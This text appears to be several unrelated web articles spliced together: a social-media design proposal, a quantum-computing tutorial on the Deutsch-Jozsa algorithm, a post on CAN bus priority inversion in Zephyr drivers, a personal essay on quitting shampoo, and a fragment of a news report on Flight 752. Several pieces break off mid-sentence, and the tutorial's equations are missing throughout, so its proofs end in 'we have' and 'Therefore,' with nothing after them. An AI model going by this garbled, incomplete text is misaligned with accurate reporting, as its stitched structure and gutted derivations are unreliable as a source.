    <p>Social media has a conflict problem.</p><p>Spending even a few minutes on public social media can expose us to dozens of people we know little about, talking about things we know little about. In such a public place, any individual's reputation, perspectives, and history are difficult to ascertain, and therefore their words must be taken at face value. Coupled with an almost complete lack of standards for participation in the community and a high degree of variance in knowledge among participants, and the environment naturally skews toward conflict and tribalism.</p><p>One particular effect of this environment is that small misunderstandings, mistakes, or disagreements can unexpectedly explode due to the public nature of discourse and assumptions of bad faith. Meanwhile, very few tools exist to moderate these effects.</p><!--kg-card-begin: markdown--><p>This is why it's my belief that <mark>as designed today, social media is out of balance</mark>. It is far easier to escalate than it is to de-escalate, and this is a major problem that companies like Twitter and Facebook need to address.</p>
<!--kg-card-end: markdown--><p>This got me thinking about what particular use cases need de-escalation, and whether there's something simple we can do to test the waters and address these types of problems. </p><h2 id="target-use-case-admitting-mistakes">Target Use Case: Admitting Mistakes</h2><p>One obvious issue is that <strong>people are wrong about a lot of things, but struggle to admit their mistakes</strong>. This is why many cultures have created elaborate norms around face-saving. Unfortunately, social media largely lacks these cultural norms, and even makes the problem worse in three ways:</p><ol><li><strong>No social proof</strong> - Admitting mistakes is quite difficult if nobody else is seen (genuinely) admitting mistakes, as we rely heavily on social proof to sense-make around norms. An escalation-oriented culture means there's less genuine "I was wrong" on social media than there should be.</li><li><strong>No respite</strong> - as the visibility of a mistake travels across social media, the poster is subject to a constant deluge of new readers calling them out, with the combined energy of the outraged far exceeding that of the poster. This prevents them from having the necessary emotional cool-down period to respond thoughtfully.</li><li><strong>Digging in</strong> - when feeling personally attacked, its human nature to prefer to dig in rather than apologize. Social media's escalation-oriented culture plays into this human fallibility.</li></ol><p>Take Twitter as an example environment. If we write something that turns out to be wrong and a pile-on begins, we're going to be swimming upstream fighting it. Our options are:</p><ol><li><strong>Ignore</strong> replies and hopefully let it die out</li><li><strong>Delete</strong> your tweet, posting another tweet saying "I was wrong"</li><li><strong>Reply</strong> to your tweet, posting "I was wrong"</li></ol><p>However, none of these are great. If we ignore<strong><em> </em></strong>replies, the simple amplification effects of likes, replies, retweets, and subtweets leave us exposed and the situation can get out of hand. If we delete and post another, people are unlikely to see our follow-up, as corrections are rarely viral. Similarly, even if we reply, only our viral mistake will be seen in the feed of others. </p><p>Let's also not forget the human tendency to not fully walk back statements, and instead offer unsatisfying explanations that can accidentally further enflame situations. Blaming, justifying, minimizing, or excusing are all self-sabotaging ways that people qualify their apologies to preserve their self-esteem or resolve their own cognitive dissonance, and social media is right there ready to give us this kind of rope to hang ourselves with when we're under assault.</p><!--kg-card-begin: markdown--><p>In all these cases, a person's reputation in the minds of others is damaged because <mark>social media engagement engines favor the drama of the mistake over the correction and reconciliation</mark>, which leads few people to see or remember anything other than the mistake.</p>
<!--kg-card-end: markdown--><p>This seems like a perfect use case to design for, so I came up with a little design change I call the Twitter Mea Culpa.</p><h2 id="design-exploration-twitter-mea-culpa">Design Exploration: Twitter Mea Culpa</h2><p>Twitter Mea Culpa is a way for a poster to flag their tweet as a mistake and de-escalate a situation, using the same action menu that deleting a post uses, and the same visual design as flagged tweets:</p><figure><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png" alt="" srcset="https://nickpunt.com/content/images/size/w600/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png 600w, https://nickpunt.com/content/images/size/w1000/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png 1000w, https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png 1260w" sizes="(min-width: 720px) 720px"><figcaption>Twitter Mea Culpa: flagging a post as a mistake</figcaption></figure><h3 id="clear-language">Clear Language</h3><!--kg-card-begin: html--><figure><a href="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Language-1.png"><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Language-1.png" alt="" srcset="https://nickpunt.com/content/images/size/w600/2020/07/TwitterMeaCulpa-Language-1.png 600w, https://nickpunt.com/content/images/size/w1000/2020/07/TwitterMeaCulpa-Language-1.png 1000w, https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Language-1.png 1198w" sizes="(min-width: 720px) 720px"></a><figcaption>Language:<em> @user has indicated they made a mistake in this tweet</em></figcaption></figure><!--kg-card-end: html--><p>I picked this language carefully for several reasons:</p><ol><li>Create separation between the individual and what they say (the specific post), which reduces ego threat.</li><li>Use an active voice to indicate responsibility (<em>I made a mistake</em> not <em>Mistakes were made</em>).</li><li>Indicate the poster was the one who chose to flag the post, not Twitter or any other user, to reduce the impression to other users that the poster was censored.</li><li>State the mistake unequivocally and leaving no room for ambiguity about whether it is actually a mistake, to reduce inauthentic use and self-sabotage.</li><li>Avoid direct use of 'sorry' or 'I apologize' language, because for some people these words are extremely <a href="https://www.psychologytoday.com/us/blog/the-squeaky-wheel/201305/5-reasons-why-some-people-will-never-say-sorry">emotionally challenging</a> to use.</li></ol><h3 id="disable-amplification">Disable Amplification</h3><!--kg-card-begin: html--><figure><a href="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Amplification-1.png"><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Amplification-1.png" alt="" srcset="https://nickpunt.com/content/images/size/w600/2020/07/TwitterMeaCulpa-Amplification-1.png 600w, https://nickpunt.com/content/images/size/w1000/2020/07/TwitterMeaCulpa-Amplification-1.png 1000w, https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Amplification-1.png 1262w" sizes="(min-width: 720px) 720px"></a></figure><!--kg-card-end: html--><p>Much like rules violations, once a user admits a mistake, the Mea Culpa tweet is no longer amplified. This means:</p><ul><li>The tweet is no longer made visible on everyone's home feed</li><li>Users cannot reply, like, or retweet without comment</li><li>Users may retweet <em>with</em> comment, to allow users to amplify the correction (e.g. <em>I thought this wasn't the case, looks like they realized it</em>)</li></ul><!--kg-card-begin: markdown--><p>By admitting a mistake, the poster stops the runaway train of replies and amplifications of their mistake, and the reputation damage that follows. In other words, <mark>Mea Culpas are intentionally designed to favor respectful debate and ability to cool off over maximal information exchange</mark>.</p>
<!--kg-card-end: markdown--><figure><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-ExampleViolation.png" alt=""><figcaption>How Twitter handles rules violations today; notice the lack of like/reply/retweet counts</figcaption></figure><p>This amplification disabling is how rules violations work today.

      <h3 id="introduction">Introduction</h3>

<p>In the previous <a href="https://leimao.github.io/blog/Deutsch-Algorithm/">blog post</a>, I discussed the Deutsch’s algorithm which determines whether the function $f(x)$ is balanced or constant by running $f(x)$ once using quantum circuits, where $f(x)$ maps from the set $\{0,1\}$ to the set $\{0,1\}$. However, using classical circuits, we are able to determine whether the function $f(x)$ is balanced or constant by running $f(x)$ twice. It might seem to some people that the improvement is not significant for this particular simple problem.</p>



<p>Let’s change the problem setting to a similar but more sophisticated one. Instead of taking one single bit as input, $f(\mathbf{x})$ now takes $n$ bits as input. Now, $f(\mathbf{x})$ maps from the set $\{0,1\}^n$ to the set $\{0,1\}$. The number of different inputs to $f(\mathbf{x})$ is $2^n$. We call the the function $f(\mathbf{x})$ balanced if $f(\mathbf{x}) = 0$ for exactly $2^{n-1}$ of all the different inputs, and $f(\mathbf{x}) = 1$ for the rest of the inputs. We call the function $f(\mathbf{x})$ constant if $f(\mathbf{x}) = 0$ for all different inputs, or $f(\mathbf{x}) = 1$ for all different inputs. $f(\mathbf{x})$ could be neither balanced or constant, but in this particular problem, we assume the $f(\mathbf{x})$ we are investigating must be either balanced or constant. It should be noted that it is a more general case for the problem that the Deutsch algorithm was trying to solve. When $n=1$, it decays to the problem that the Deutsch algorithm was trying to solve.</p>



<p>With classical circuits, what is the minimum and maximum number of runs to determine whether $f(\mathbf{x})$ we are investigating must be either balanced or constant? We have $2^n$ different inputs to test for this binary classification problem. In the worst scenario, we could run into the situation that the first $2^{n-1}$ inputs we tested produce all $0$s or all $1$s. Then the $2^{n-1} + 1$th input we tested must tell us whether $f(\mathbf{x})$ could be neither balanced or constant. For example, if the first $2^{n-1}$ inputs we tested produce all $0$s, if the $2^{n-1} + 1$th input we tested produces $0$, then $f(\mathbf{x})$ is constant; if the the $2^{n-1} + 1$th input we tested produces $1$, then $f(\mathbf{x})$ is balanced. In the best scenario, we got both $0$ and $1$ in the first two runs, we immediately know $f(\mathbf{x})$ is balanced.</p>



<p>With quantum circuits, can we do better and how much can we do better? In fact, there is a Deutsch-Jozsa algorithm, a derivative of the Deutsch algorithm, which solve the problem using exactly one run. If you compared to the worst case using classical circuits, it is $2^{n-1} + 1$ times faster asymptotically, which is significant when $n$ is large.</p>



<p>In this blog post, I would like to discuss the Deutsch-Jozsa algorithm. It would be recommended if the reader could read the blog on <a href="https://leimao.github.io/blog/Deutsch-Algorithm/">Deutsch algorithm</a> first, although this blog post should be mostly self-contained.</p>

<h3 id="prerequisites">Prerequisites</h3>

<h4 id="reducing-sum-or-difference-to-boolean">Reducing Sum or Difference to Boolean</h4>

<p>If $x$ and $y$ are binary values, $x, y \in \{0, 1\}$, we have</p>



<p>where $\oplus$ is $\text{XOR}$ (binary addition modulo 2). This could be easily verified using truth table.</p>

<h4 id="distributivity-of-xor">Distributivity of XOR</h4>

<p>If $x$, $y$, and $z$ are binary values, $x, y, z \in \{0, 1\}$, we have</p>



<p>I did not find a proof from the Internet so I derived a proof here. The proof is a little bit complicated and requires to use boolean algebra.</p>



<p>It is easy to verify using truth table that</p>



<p>Using the basic <a href="https://en.wikipedia.org/wiki/Boolean_algebra#Laws">boolean algebra</a>, we have</p>





<p>Therefore,</p>



<p>This concludes the proof.</p>

<h4 id="inner-product-and-inner-product-space-for-binary-vector-space">Inner Product and Inner Product Space for Binary Vector Space</h4>

<p>In the previous <a href="https://leimao.github.io/blog/Inner-Product/">blog post</a>, we have defined the inner product and inner product space for complex vector space. Similarly, we could also define the inner product and inner product space for binary vector space.</p>



<p>Given two binary vectors $\mathbf{x}, \mathbf{y} \in \{0,1\}^n$, $\mathbf{x} = \{x_0, x_1, \cdots, x_{n-1}\}$ and $\mathbf{y} = \{y_0, y_1, \cdots, y_{n-1}\}$, the inner product of $\mathbf{x}$ and $\mathbf{y}$ is defined as</p>



<p>which is somewhat similar to the inner product definition for real vector space.</p>



<p>The bitwise exclusive-or operation $\oplus$ was also defined for binary vectors $\mathbf{x}$ and $\mathbf{y}$ of the same length. Given two binary vectors $\mathbf{x}, \mathbf{y} \in \{0,1\}^n$, $\mathbf{x} = \{x_0, x_1, \cdots, x_{n-1}\}$ and $\mathbf{y} = \{y_0, y_1, \cdots, y_{n-1}\}$,</p>



<p>The following inner product properties are satisfied based on the above inner product definition.</p>



<p>Given $\mathbf{x}, \mathbf{x}^{\prime}, \mathbf{y}, \mathbf{y}^{\prime} \in \{0,1\}^n$, using the $\text{XOR}$ distributivity property we derived above,</p>



<p>Similarly,</p>



<p>Let $\mathbf{0} = \{ \underbrace{0, 0, \cdots, 0}_{n} \} =  0^n$, we have</p>



<h4 id="hadamard-operator">Hadamard Operator</h4>

<p>Hardmard operator is a special quantum operator, which could be represented using the following unitary matrix.</p>



<p>It is easy to see that</p>





<p>We denote</p>



<p>It is easy to see that $H$ is unitary, i.e., $H H^{\dagger} = H^{\dagger} H = I$ and $H^{\dagger} = H$. In fact, $H^{\otimes n}$ is unitary, and $(H^{\otimes n})^{-1} = H^{\otimes n}$.</p>



<p>For Kronecker product, the $A \otimes B$ is invertible if and only if both $A$ and $B$ are invertible and</p>



<p>It is easy to verify this using the <a href="https://leimao.github.io/blog/Kronecker-Product-In-Circuits/">Kronecker product mixed-product property</a>.</p>



<p>Therefore,</p>



<p>The values in the matrix $H^{\otimes n}$ follows specific patterns. Specifically,</p>



<p>where $\mathbf{i}$ is the binary vector representation for row number $i$, and $\mathbf{j}$ is the binary vector representation for column number $j$.</p>



<p>Since I did not find any proof from the Internet, I would like to derive a simple proof using mathematical induction.</p>



<p>For the base case for $n = 1$, it is easy to verify that</p>



<p>where $i, j \in [0, 2^1)$, i.e., $\mathbf{i}, \mathbf{j} \in \{0, 1\}^{1}$.</p>



<p>Assuming for $n = k - 1$,</p>



<p>where $i, j \in [0, 2^{k-1})$, i.e., $\mathbf{i}, \mathbf{j} \in \{0, 1\}^{k - 1}$.</p>



<p>For $n = k$, we have</p>



<p>Note that $H^{\otimes {k-1}}$ is a $2^{k-1}$ by $2^{k-1}$ matrix.</p>



<p>For $i \in [0, 2^{k-1})$ and $j \in [0, 2^{k-1})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 0$, and $j_0 = 0$.</p>



<p>Therefore,</p>



<p>where $i \in [0, 2^{k-1})$ and $j \in [0, 2^{k-1})$.</p>



<p>For $i \in [2^{k-1}, 2^{k})$ and $j \in [0, 2^{k-1})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 1$, and $j_0 = 0$.</p>



<p>Therefore,</p>



<p>where $i \in [2^{k-1}, 2^{k})$ and $j \in [0, 2^{k-1})$.</p>



<p>For $i \in [0, 2^{k-1})$ and $j \in [2^{k-1}, 2^{k})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 0$, and $j_0 = 1$.</p>



<p>Therefore,</p>



<p>where $i \in [0, 2^{k-1})$ and $j \in [2^{k-1}, 2^{k})$.</p>



<p>For $i \in [2^{k-1}, 2^{k})$ and $j \in [2^{k-1}, 2^{k})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 1$, and $j_0 = 1$.</p>



<p>Based on the reducing sum or difference to boolean property we derived above,</p>



<p>Therefore,</p>



<p>where $i \in [2^{k-1}, 2^{k})$ and $j \in [2^{k-1}, 2^{k})$.</p>



<p>Taken together, for $n = k$,</p>



<p>where $i, j \in [0, 2^k)$, i.e., $\mathbf{i}, \mathbf{j} \in \{0, 1\}^{k}$.</p>



<p>This finishes the mathematical induction and concludes the proof.</p>



<p>Note that the entries of the first column and the entries of the first row of $H^{\otimes {n}}$ have exactly the same value, $\frac{1}{\sqrt{2^{n}}}$. This is because</p>





<p>Equivalently, we might write, $H^{\otimes {n}}_{0,:} = \frac{1}{\sqrt{2^{n}}} \mathbf{1}$ and $H^{\otimes {n}}_{:,0} = \frac{1}{\sqrt{2^{n}}} \mathbf{1}$.</p>



<p>To extract an arbitrary column $j$ from $H^{\otimes {n}}$, we prepared a one-hot quantum system basic state vector $| \mathbf{y} \rangle = [y_0, y_1, \cdots, y_{2^n-1}]^{\top}$, where $y_j = 1$ and $y_k = 0$ for $k \neq j$.</p>



<p>where $| \mathbf{x}_i \rangle$ is a quantum system one-hot basic state vector,  $|\mathbf{x}_i\rangle = [x_0, x_1, \cdots, x_{2^{n}-1}]^{\top}$, where $x_i = 1$ and $x_k = 0$ for $k \neq i$.</p>



<p>Since $H^{\otimes {n}}$ is unitary and $(H^{\otimes {n}})^{-1} = H^{\otimes {n}}$as we have discussed above,</p>



<p>For example, if $j = 0$, $| \mathbf{y} \rangle = [\underbrace{1, 0, 0, \cdots, 0}_{2^n} ]^{\top} = | \mathbf{0} \rangle$,</p>



<h3 id="deutsch-jozsa-algorithm">Deutsch-Jozsa Algorithm</h3>

<p>The black-box $f(\mathbf{x})$ is represented using a quantum gate $U_f$. Our job is to determine whether the $f(\mathbf{x})$ corresponding to the $U_f$ is constant or balanced.</p>

<div>
<figure>

    <figcaption>$U_f$</figcaption>
</figure>
</div>

<p>The quantum gate $U_f$ is a unitary matrix which maps from $| \mathbf{x} \rangle \otimes | y \rangle$ to $| \mathbf{x} \rangle \otimes | f(\mathbf{x}) \oplus y \rangle$, namely $U_f (| \mathbf{x} \rangle \otimes | y \rangle) = | \mathbf{x} \rangle \otimes | f(\mathbf{x}) \oplus y \rangle$, for $x \in \{0, 1\}^n$ and $y \in \{0, 1\}$. When $y = 0$, $| f(\mathbf{x}) \oplus y \rangle = | f(\mathbf{x}) \oplus 0 \rangle = | f(\mathbf{x}) \rangle $, $| y \oplus f(\mathbf{x}) \rangle$ is just $| f(\mathbf{x}) \rangle$.</p>



<p>Note that the above mapping is only necessarily valid when $| \mathbf{x} \rangle$ and $| y \rangle$ are superpositions.</p>



<p>Let’s further check when $| \mathbf{x} \rangle$ and $| y \rangle$ are superpositions, what the outputs from $U_f$ will be. Perhaps we could achieve fewer runs with superpositions.</p>

<h4 id="first-attempt">First Attempt</h4>

<p>In the first attempt, we made the second input to $U_f$ a superposition, which is achieved by applying a Hadamard operator to the second input $|1\rangle$. This is almost the same as what we did in the second attempt in the <a href="https://leimao.github.io/blog/Deutsch-Algorithm/">Deutsch algorithm</a>. The superposition is</p>

</div>







<p>Because $\frac{|f(\mathbf{x})\rangle - |\overline{f(\mathbf{x})}\rangle}{\sqrt{2}}$ is either $\frac{|0\rangle - |1\rangle}{\sqrt{2}}$ or $\frac{|1\rangle - |0\rangle}{\sqrt{2}}$, $|\varphi_2\rangle $ could be further simplified as</p>



<p>The observation from the first output is always the same to the first input, whereas there …</p></div></div>

    <p>The problem of <strong>priority inversion</strong> is well-known and.. actually, scratch that: it’s clearly not well known at all because people keep making the
same mistake. So I’m writing this to try and explain the problem (with reference to CAN) in the hope that a search engine indexes this and puts
it high enough up the search results for people to find.</p>

<p>The TL;DR for priority inversion:</p>

<blockquote>
  <p>Priority inversion causes a high priority activity to get delayed for a long time, causing missed deadlines, timeouts, and all kinds of
consequent faults. Worse, it’s typically an intermittent problem often not found in testing, and a great source of Heisenbugs because adding
instrumentation to look at it can make it go away.
It happens when the high priority (and urgent) activity gets stuck behind a low priority (non-urgent) activity and
lots of medium priority activities block the low priority activity, which is blocking the high priority activity.</p>
</blockquote>

<p>The word ‘activity’ here can mean tasks in a real-time system, scheduled by an RTOS (real-time operating system) that chooses what to run
based on priorities.  This is exactly what happened on Mars on the 4th July 1997 when the Mars Pathfinder mission landed.</p>

<p><img src="https://kentindell.github.io/assets/384_pathfinder.jpg" alt="Mars Pathfinder"></p>

<p>The spacecraft control system kept going through watchdog resets, triggered because
a high priority task didn’t complete in time. The problem was down to priority inversion around access to a resource guarded by a semaphore. A low
priority task had the resource locked, and the high priority task was blocked waiting for the low priority task to release the semaphore.
But the low priority task couldn’t run because medium
priority tasks were running, so it couldn’t unlock the semaphore, and so the high priority task got stuck, the watchdog triggered, the system reset,
and the process repeated. You can read more about it directly from the
<a href="https://www.cs.unc.edu/~anderson/teach/comp790/papers/mars_pathfinder_long_version.html">horse’s mouth</a>
(Glenn Reeves, the NASA team lead for the Pathfinder spacecraft software).</p>

<p>Priority inversion also happens in CAN. The CAN protocol uses priorities (in the form of CAN IDs) to determine which frame is transmitted on the bus.
But the CAN specification says nothing about how frames <em>within</em> a CAN controller are arbitrated. What <em>should</em> happen is that frames are internally
arbitrated by priority, so that the frame the CAN engine enters into bus arbitration is the highest of its own frames, and then the CAN bus arbitration
picks the highest priority frame bus-wide. But if a FIFO queue is used internally then we get priority
inversion.</p>

<p>Here’s a short video showing how priority inversion plays out on CAN bus:</p>

<p>
  <iframe src="https://www.youtube.com/embed/0xkZ8glPSXA" width="700" height="480" frameborder="0" allowfullscreen="">
  </iframe>
</p>

<p>This isn’t a theoretical problem. Let’s take a look at the <a href="https://zephyrproject.org/">Zephyr Project</a> CAN system.
The <a href="https://docs.zephyrproject.org/latest/reference/networking/can_api.html">CAN API</a> is very simple, with just a <code>can_send</code> call to queue a CAN frame
(a callback can be set for a “sent” event). There’s nothing inherently wrong with this API. If the number of buffer slots supports is small then there is
pressure on the application developer to create their own queue in software, and inevitably this will be a FIFO queue (I’ll come back to this shortly).
The problem is deeper in the drivers. Here is a code snippet from the
code for the <a href="https://github.com/zephyrproject-rtos/zephyr/blob/master/drivers/can/can_stm32.c">STM32 CAN controller driver</a>:</p>

<div><div><pre><code>	/* Set TX priority to chronological order */
	can-&gt;MCR |= CAN_MCR_TXFP;
</code></pre></div></div>

<p>The bit <code>TXFP</code> is described in the STM32 reference manual for the bxCAN CAN controller as follows:</p>

<blockquote>
  <p>“The transmit mailboxes can be configured as a transmit FIFO by setting the <code>TXFP</code> bit in the <code>CAN_MCR</code> register. In this mode the priority order is
given by the transmit request order. This mode is very useful for segmented transmission.</p>
</blockquote>

<p>Yep, we have a priority inversion problem with these drivers. Let’s look at the <code>can_send</code> function in the
<a href="https://github.com/zephyrproject-rtos/zephyr/blob/master/drivers/can/can_mcux_flexcan.c">NXP FlexCAN drivers</a>:</p>

<div><div><pre><code>	while (true) {
		alloc = mcux_get_tx_alloc(data);
		if (alloc &gt;= 0) {
			if (atomic_test_and_set_bit(data-&gt;tx_allocs, alloc)) {
				continue;
			}

			break;
		}

		if (k_sem_take(&amp;data-&gt;tx_allocs_sem, timeout) != 0) {
			return CAN_TIMEOUT;
		}
	}
</code></pre></div></div>

<p>The NXP FlexCAN controller is a slotted buffer controller, which means it has lots of CAN frame buffer slots in its memory, allocated between sending
and receiving CAN frames.  The controller can be set to arbitrate between its frames by buffer number or by CAN ID. The driver selects arbitration by 
buffer number and then in the <code>can_send</code> function they allocate a buffer higher than any buffer in use, in order to preserve FIFO transmission order:</p>

<div><div><pre><code>	/* mcux_get_tx_alloc is a linear on array, and binary on atomic_val_t search
	 * for the highest bit set in data-&gt;tx_allocs. 0 is returned in case of an empty
	 * tx_alloc, the next free bit otherwise.
	 * The reason to always use a higher buffer number than the current in use is
	 * that a FIFO manner is kept. The Controller would otherwise send the frame
	 * that is in the lowest buffer number first.
	 */
</code></pre></div></div>

<p>So this driver specifically implement FIFO buffering, which is bad enough, but worse than that is that it spins waiting for a free buffer,
where “free” doesn’t mean buffer without a CAN frame in it, but one where the buffer number is
higher than any frame in the controller. What will tend to happen under peak bus load is that the buffer number will ‘walk’ up to the top one,
and then when that buffer contains a
low priority frame, the task will spin on a sequence of CAN transmit events for ages waiting for it to be put into the (this could be tens or
hundreds of milliseconds on a busy CAN bus).
In essence, this couples priority inversion on the CAN bus to task execution, causing a task
to overrun and fail in unpredictable ways. And it’s an intermittent problem that probably won’t appear in testing. Obviously this is a terrible driver design.</p>

<p>It may look like I am picking on the Zephyr Project, but far from it: I’ve come across it in many other CAN drivers too, <strong>even in a self-driving
car system</strong> where the steering depended on sending a CAN frame with a short latency!</p>

<p>So how is priority inversion solved? What is required to solve it? In short, the CAN frame queueing in the CAN driver must be by CAN ID value, using the same
ordering as on the CAN bus. For CAN controllers that support a large number of messages then this is usually as simple as flipping a bit to ask the controller
to arbitrate internally this way (the FlexCAN and the bxCAN controllers by default come out of reset in this mode!).</p>

<p>For CAN controllers with only three
buffers then the software drivers must keep a bigger priority queue in memory and then shuffle the frames back and forth to keep the highest priority three
frames in the hardware. All these controllers provide an an abort mechanism so that a low priority CAN frame in a hardware buffer can be thrown out and
replaced by a new higher priority frame. The CAN controllers are generally designed to help with this: the bxCAN has a <code>CODE</code> field and the FlexCAN
has a <code>LPTM</code> field to indicate which of the transmit buffers is the lowest-priority one.</p>

<p>Note that the common Microchip MCP2515 standalone CAN controller has three transmit buffers, but it doesn’t arbitrate internally by CAN ID (there is a
2-bit priority field for each buffer, but this won’t work because the priorities would need to be atomically re-ordered when a new
frame is put in the controller). It’s simpler to just use a single buffer and use the abort mechanism when a low-priority frame needs to 
be pre-empted.</p>

<p>One final point worth discussing is why people are so attracted to FIFO queueing of CAN frames (even to the point of disabling the default priority queueing
in CAN controllers)? One answer to this is <em>segmented messages</em>: quite a few CAN layers define ways to map a message longer than 8 bytes into a
sequence of 8-byte CAN
frames, and this nearly always is done by transmitting a sequence of CAN frames with the same ID. It’s obviously vital that these
frames go into FIFO order because otherwise the bigger message is scrambled. The problem with queueing by CAN priority is that
under nearly all priority queueing implementations (both hardware and software), two internal frames with the same ID are entered into arbiration in an
undefined transmission order (for example, the FlexCAN hardware uses an internal hardware scanning state machine that loops around all the buffers
looking for the lowest priority frame). The solution to this
is not, of course, to make all CAN frames go in FIFO order, but to make only frames for a segmented message go in FIFO order <em>with respect to each other</em>. This
is actually straightforward to implement using a higher-level FIFO driver, that creates a FIFO queue of frames and then hands them to the CAN driver 
one-by-one as each previous frame is sent.</p>

<p>So to summarise:</p>

<ul>
  <li>Priority inversion is a big deal, it’s an intermittent problem that might escape testing but could be catastrophic when deployed</li>
  <li>Priority inversion happens on CAN</li>
  <li>It is fixed by having the hardware arbitrate internally by CAN ID</li>
  <li>If there aren’t enough buffers in hardware then the driver should implement them in software using the abort feature of the CAN hardware and not just push the problem up to the application (which will inevitably just use a FIFO queue)</li>
  <li>Where FIFO sending is important (e.g. segmented messaging) it should be done by a specific higher level FIFO queueing system that creates separate FIFO queues and puts the head item of each FIFO into the priority queue.</li>
</ul>

<p>UPDATE 2020/07/01:</p>

<ul>
  <li>I have rewritten the wording on CPU execution being coupled to priority inversion to make it clear the task is spinning on a transmit event rather than the CPU itself spinning in a loop</li>
  <li>As a courtesy I reported this priority inversion issue to the Zephyr Project; it was subsequently reclassified from “bug” to “enhancement” because not suffering from priority inversion is apparently a ‘nice to have’ feature of an RTOS designed for safety critical systems</li>
</ul>

July 4, 2020 | https://jayriverlong.github.io/2020/07/04/shampoo.html | <a href="https://web.archive.org/web/*/https://jayriverlong.github.io/2020/07/04/shampoo.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>In December 2019, my girlfriend mentioned that my hair smelled unusually good. What was I doing differently? Nothing, I thought. Everything was just as always. Except that I had run out of shampoo a few weeks prior, and hadn’t noticed until then.</p> <p>As a teen, I used plenty of hair products. Gels were cool in the early 2000s, and sculpting wax remained in vogue even afterwards. Such products require washing out at the end of the day, otherwise it feels gross, and (ironically) would make your hair unwieldy afterwards. By the time I got to college, I was used to shampooing my hair most days.</p> <p>However, my college roommate suffered from severe male pattern balding as he hit his early 20s, and he made that suffering a core piece of his identity. Fear is contagious, so I quit hair products, and began to exclusively use the most scalp-friendly shampoo I could find, <a href="https://www.kiehls.com/hair/shampoos/amino-acid-shampoo/247.html">Kiehl’s Amino Acid Shampoo</a>. I reduced my shampooing to twice a week, and was careful not to use too much.<sup id="fnref:1"><a href="#fn:1">1</a></sup> My hair was fine and usually short, so that was perfectly sufficient for the most part of the last decade.</p> <p>That was until I ran out in mid-November 2019. I hadn’t even noticed, and my girlfriend had complimented me on my hair, so I thought I might as well keep going. I had previously read about the <a href="https://www.reddit.com/r/NoPoo/">NoPoo Movement</a> – people washing their hair with stuff like olive oil or quitting shampoo altogether – and that had been intriguing. Ever since I tried anti-dandruff shampoo and it immediately gave me dandruff, I had a hunch that shampoo might just be a scam. I was ready to give NoPoo a try.</p> <p>Seven or eight months later, I still haven’t used shampoo or conditioner once. I rinse it with warm water every morning when I shower, give it a quick rub with a towel, brush it, and I’m off to the races.</p> <p>The results are fantastic. My hair is silky smooth, looks and feels clean, and a slight build-up of natural oils makes it easy to form. If I run my hand through my hair to push it back, it stays (mostly) in place.</p> <p>Keeping my hair in place had been a real frustration with a frequent shampooing routine: my hair would be so light and dry that it was impossible to rule – I would <em>have</em> to use a product to keep it from dangling into my forehead, or I’d have to get haircuts to specifically trim the unruly parts that would stick out. Reducing shampoo – and eventually eliminating it – made it possible to actually get somewhere combing it.</p> <p>During this time – thanks to COVID-19 – I haven’t had a haircut, so my hair is now also longer than usual. (I feel like a stand-in from an ’80s movie.) It’s easy to go NoPoo when you have short hair, because there’s ultimately little hair to accumulate lots of grease and oil. The threat of greasy hair is more severe when your hair is longer, which is why I suspect it’s mostly men<sup id="fnref:2"><a href="#fn:2">2</a></sup> who opt to abandon shampoo. For me, it ended up fine.</p> <p>Abandoning shampoo works because it restores the natural balance of oils on your scalp. Most shampoos are effectively like dish soap: they aggressively remove grease from your head. That dries out your scalp, so – no surprise – you produce <em>more</em> oils to compensate. That makes your hair greasy in short order, so you then have to shampoo again. It’s even more extreme if you apply additional grease in form of hair products. Like a ketamine-cocaine bender, you are net balanced while swinging between extremes. That’s not great. Consequently, most people report that the toughest thing about abandoning shampoo is the first two or three weeks, while your hair becomes quite greasy as your scalp readjusts how much oil it needs to produce. I was fortunate that during that time, I had been too busy to notice.</p> <p>I hope to get a haircut soon as COVID wraps up, but I don’t see myself using shampoo again in the course of my everyday life. It might be worth making exceptions if I somehow get really dirty in nature or doing some DIY stuff,<sup id="fnref:3"><a href="#fn:3">3</a></sup> but for the most part it just seems unnecessary.</p> <hr>  <br> </article> </div></div>]]>

The crash of Flight 752 killed 176 people, including 57 Canadians.</p>  <p>The recording, which reveals a number of damning details about the downing of the plane and Iran's response, is also in the custody of Canadian authorities.</p>  <p>Less than 24 hours after CBC News emailed Rezaeifar a copy of the recording and requested a response Thursday, news broke that he had been removed from his role overseeing Iran's investigation into the downing of Flight 752. Families in the United Kingdom — which has&nbsp;an embassy in Iran — were notified this morning that a new investigator is now in charge.</p>  <h2>Airspace kept open to avoid signalling&nbsp;attack:&nbsp;Rezaeifar</h2>  <p>In the recording, Rezaeifar said closing the airspace over Tehran could have exposed Iran's pending ballistic missile attack on U.S. air bases in Iraq in advance. That attack was retaliation for the United States' killing of Iran's top military leader,&nbsp;Gen.&nbsp;Qasem Soleimani.</p>  <p>"Some say we should have cleared the airspace," Rezaeifar said in Farsi on the recording. "The National Security Council is in charge.</p>  <p>"But let's say we had cleared the airspace. Wouldn't [it] give away our imminent attack?"</p>  <p>Flight 752 was shot down just four hours after the strike on the U.S. base. Rezaeifar added that&nbsp;closing the airspace could have meant 